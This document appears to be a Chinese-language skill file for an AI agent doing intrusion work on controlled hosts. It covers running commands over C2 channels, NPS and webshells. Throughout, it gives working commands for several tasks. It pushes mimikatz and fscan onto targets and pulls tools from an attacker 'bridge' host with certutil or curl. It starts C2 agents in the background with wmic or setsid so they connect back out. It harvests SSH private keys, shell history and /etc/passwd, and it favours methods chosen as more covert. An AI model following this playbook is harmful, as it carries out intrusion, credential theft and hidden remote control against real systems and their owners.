---
name: remote-cmd-execution
description: |
  Windows/Linux 远程命令执行规范技能。覆盖常见 C2/远程执行通道的命令执行规范、Windows cmd /c 要求与绝对路径、
  Linux nohup/后台执行、wmic/setsid 后台启动、工具上传语义、常用命令路径参考。
  触发场景：用户通过 NPS execcmd、C2 exec、WebShell、SSH、WinRM 或其他远程执行通道在受控主机上执行命令、遇到命令不回显、命令超时、
  路径错误、找不到命令、工具上传后执行失败、后台进程启动、文件下载传输、
  环境变量/PATH 异常时使用。同时适用于 Windows 和 Linux 主机。
---

# Remote CMD Execution

你处理的是"如何在受控主机（Windows/Linux）上通过远程执行通道稳定执行命令"这个问题。命令执行失败的首要原因不是权限，而是命令格式、路径规范、执行方式选择错误。

---

## 通用铁律（Windows/Linux 共用）

### 1. 远程执行通道通常有超时限制

所有超过通道超时阈值的任务（fscan 扫描、agent 上线、大文件传输）必须后台启动，不能同步执行。NPS execcmd 常见超时约 10 秒，其他 C2/WebShell/WinRM/SSH 通道也应按实际超时处理。

### 2. upload_file 的 path 参数是目录，不是完整路径

```python
# ✅ path 是目录
upload_file(cid, "/opt/tools/fscan", "C:\\Users\\Public")      # Windows
upload_file(cid, "/opt/tools/fscan", "/tmp")                     # Linux

# ❌ path 写成完整文件路径
upload_file(cid, "/opt/tools/fscan", "C:\\Users\\Public\\fscan.exe")
upload_file(cid, "/opt/tools/fscan", "/tmp/fscan")
```

上传后**必须确认文件落地**，不要假设上传成功：
- Windows: `cmd.exe /c dir <path>`
- Linux: `ls -la <path>`

### 3. 优先使用当前控制通道的文件下发能力

如果当前 C2/远程管理平台自带文件上传/下载能力，优先直接下发工具，而不是让目标机 `curl`/`wget`/`certutil` 从外部拉取。这样更稳定、更隐蔽、不依赖目标出网。NPS 的 `push_tool` / `upload_file` 只是示例。

```python
# ✅ 优先：当前 C2/管理平台直接下发
push_tool(cid, "fscan/fscan_linux_amd64", "/tmp")
upload_file(cid, "/opt/nps_tools/mimikatz.exe", "C:\\Users\\Public")

# ⚠️ 备选：平台文件功能不可用时才用命令下载
exec_cmd(cid, "curl -o /tmp/fscan http://<bridge>:44944/files/fscan")
exec_cmd(cid, 'certutil -urlcache -split -f http://<bridge>:44944/files/npc.exe C:\\Users\\Public\\npc.exe')
```

### 4. 优先使用绝对路径

不要依赖 PATH 环境变量。Web 进程、C2 agent 进程、计划任务或服务进程的 PATH 可能与交互式 shell 完全不同。

### 5. Agent 架构选择：默认 64 位

- **默认使用 64 位**：例如 `npc_windows_amd64.exe` / `npc_linux_amd64`，或当前 agent 的 amd64 版本
- **仅当 `systeminfo` 明确显示 `x86` / `i586` / `32-bit` 时才用 32 位**
- Windows Server 2008 R2 及以上几乎都是 64 位，不要因为前一台机器是 32 位就假设后续也是
- Agent 上线失败时，**第一步检查架构是否匹配**

### 6. 平台封装工具故障快速降级

C2/管理平台的封装命令可能有文件名映射、参数转义或路径处理 bug（例如封装运行 `fscan.exe` 但实际文件是 `fscan_windows_386.exe`）。

**如果封装命令报错或执行失败**（"不是内部或外部命令"、文件找不到等），立即降级到手动流程：
```python
# 1. 手动上传
upload_file(cid, "/opt/nps_tools/fscan/fscan_windows_amd64.exe", "C:\\Users\\Public")
# 2. dir 确认实际文件名
exec_cmd(cid, "C:\\Windows\\System32\\cmd.exe /c dir C:\\Users\\Public\\fscan*")
# 3. 用确认到的实际文件名执行
exec_cmd(cid, 'C:\\Windows\\System32\\wbem\\wmic.exe process call create "C:\\Users\\Public\\fscan_windows_amd64.exe -h 10.0.20.0/24 -o C:\\Users\\Public\\result.txt"')
```

**禁止封装失败后切换到代理扫描等替代链路** — 直接修正本地执行即可。

---

## Windows 专项

### W1. execcmd 命令必须以 `cmd /c` 开头

某些远程执行 API（例如 NPS `exec_cmd`）不经过 cmd.exe 解释器。`dir`、`type`、`echo`、`set` 等是 cmd.exe 内建命令，不以 `cmd /c` 开头不会执行。

```python
# ✅ 正确
exec_cmd(cid, "C:\\Windows\\System32\\cmd.exe /c dir C:\\Users\\Public\\")
exec_cmd(cid, "C:\\Windows\\System32\\cmd.exe /c type C:\\Users\\Public\\result.txt")

# ❌ 错误 — 内建命令裸执行
exec_cmd(cid, "dir C:\\Users\\Public\\")
```

### W2. 长时间任务用 wmic 后台启动

```python
# ✅ wmic 后台启动
exec_cmd(cid, 'C:\\Windows\\System32\\wbem\\wmic.exe process call create "C:\\Users\\Public\\fscan.exe -h 10.0.20.0/24 -o C:\\Users\\Public\\result.txt"')

# ❌ 同步执行长任务（10秒后超时）
exec_cmd(cid, "C:\\Users\\Public\\fscan.exe -h 10.0.20.0/24")
```

### W3. Windows 常用命令绝对路径参考

| 命令 | 绝对路径 |
|------|----------|
| cmd.exe | `C:\Windows\System32\cmd.exe` |
| whoami | `C:\Windows\System32\whoami.exe` |
| ipconfig | `C:\Windows\System32\ipconfig.exe` |
| tasklist | `C:\Windows\System32\tasklist.exe` |
| findstr | `C:\Windows\System32\findstr.exe` |
| wmic | `C:\Windows\System32\wbem\wmic.exe` |
| certutil | `C:\Windows\System32\certutil.exe` |
| net | `C:\Windows\System32\net.exe` |
| netstat | `C:\Windows\System32\netstat.exe` |
| route | `C:\Windows\System32\route.exe` |
| systeminfo | `C:\Windows\System32\systeminfo.exe` |
| reg | `C:\Windows\System32\reg.exe` |
| sc | `C:\Windows\System32\sc.exe` |
| schtasks | `C:\Windows\System32\schtasks.exe` |
| powershell | `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` |

### Windows 常见操作模式

```python
# 文件下载（certutil，仅在平台文件下发不可用时）
exec_cmd(cid, 'C:\\Windows\\System32\\cmd.exe /c C:\\Windows\\System32\\certutil.exe -urlcache -split -f http://<url>/file.exe C:\\Users\\Public\\file.exe')

# 进程查找（tasklist + findstr 管道）
exec_cmd(cid, 'C:\\Windows\\System32\\cmd.exe /c C:\\Windows\\System32\\tasklist.exe | C:\\Windows\\System32\\findstr.exe /i npc')

# Agent 后台启动
exec_cmd(cid, 'C:\\Windows\\System32\\wbem\\wmic.exe process call create "C:\\Users\\Public\\npc.exe -server=<bridge_ip>:8024 -vkey=auto"')

# 读取文件
exec_cmd(cid, 'C:\\Windows\\System32\\cmd.exe /c type C:\\Users\\Public\\result.txt')

# 目录列表
exec_cmd(cid, 'C:\\Windows\\System32\\cmd.exe /c dir C:\\Users\\Public\\')
```

---

## Linux 专项

### L1. 长时间任务用 nohup + & 后台启动

```python
# ✅ nohup 后台
exec_cmd(cid, "nohup /tmp/fscan_linux_amd64 -h 10.0.20.0/24 -o /tmp/result.txt &")

# ✅ setsid 脱离终端（更可靠，不受 HUP 信号影响）
exec_cmd(cid, "setsid /tmp/<agent_binary> <agent_args> > /tmp/agent.log 2>&1 &")

# ❌ 同步执行长任务
exec_cmd(cid, "/tmp/fscan_linux_amd64 -h 10.0.20.0/24")
```

### L2. 工具上传后必须 chmod +x

```python
push_tool(cid, "fscan/fscan_linux_amd64", "/tmp")
exec_cmd(cid, "chmod +x /tmp/fscan_linux_amd64")
exec_cmd(cid, "ls -la /tmp/fscan_linux_amd64")  # 确认权限
```

### L3. Linux 常用路径和命令

| 命令 | 路径 | 说明 |
|------|------|------|
| id | `/usr/bin/id` | 当前用户信息 |
| whoami | `/usr/bin/whoami` | 当前用户名 |
| ip | `/usr/sbin/ip` 或 `/sbin/ip` | 网络配置 |
| ss | `/usr/bin/ss` | 端口监听 |
| curl | `/usr/bin/curl` | HTTP 请求 |
| wget | `/usr/bin/wget` | 文件下载 |
| python3 | `/usr/bin/python3` | Python 解释器 |
| bash | `/bin/bash` | Shell |

### Linux 常见操作模式

```python
# 信息收集
exec_cmd(cid, "id && uname -a && ip a && ip route")
exec_cmd(cid, "cat /etc/passwd && cat /etc/hosts && cat /etc/resolv.conf")

# 文件下载（仅在平台文件下发不可用时）
exec_cmd(cid, "curl -o /tmp/tool http://<bridge>:44944/files/tool && chmod +x /tmp/tool")

# Agent 后台启动
exec_cmd(cid, "setsid /tmp/<agent_binary> <agent_args> > /tmp/agent.log 2>&1 &")

# 读取扫描结果
exec_cmd(cid, "cat /tmp/result.txt")

# 检查进程
exec_cmd(cid, "ps aux | grep -E 'agent|npc|frpc|sliver'")

# 检查端口监听
exec_cmd(cid, "ss -tlnp | grep -E '8024|1080'")

# 历史命令和密钥（信息收集重点）
exec_cmd(cid, "cat ~/.bash_history 2>/dev/null | tail -50")
exec_cmd(cid, "ls -la ~/.ssh/ 2>/dev/null && cat ~/.ssh/id_rsa 2>/dev/null")
```

---

## 排错检查清单

### 通用

1. **是否超时**：长任务必须后台执行（Windows: wmic, Linux: nohup/setsid）
2. **上传是否成功**：先确认文件存在和大小（dir / ls -la）
3. **是否 PATH 异常**：用绝对路径替代命令名

### Windows 专项

4. **是否缺 `cmd /c`**：内建命令必须通过 cmd.exe 执行
5. **管道符转义**：某些上下文中 `|` 需要用 `^|` 转义

### Linux 专项

6. **是否缺执行权限**：上传后 `chmod +x`
7. **是否被杀**：检查 `dmesg` 或 `/var/log/` 中的 OOM/killed 日志
8. **shell 环境差异**：`/bin/sh` 可能是 dash 而非 bash，某些语法不兼容

## 与其他 skill 的关系

- 需要上传/下载文件、创建隧道 → 调用当前环境对应 operator；如果使用 NPS，再调用 `nps-operator`
- PHP webshell 构造 → 调用 `php-payload-builder`
- 整体渗透流程 → 回到 `intranet-pentest`
